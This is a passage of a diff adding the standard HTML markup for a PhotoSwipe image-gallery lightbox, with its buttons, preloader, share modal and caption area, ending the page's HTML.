+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
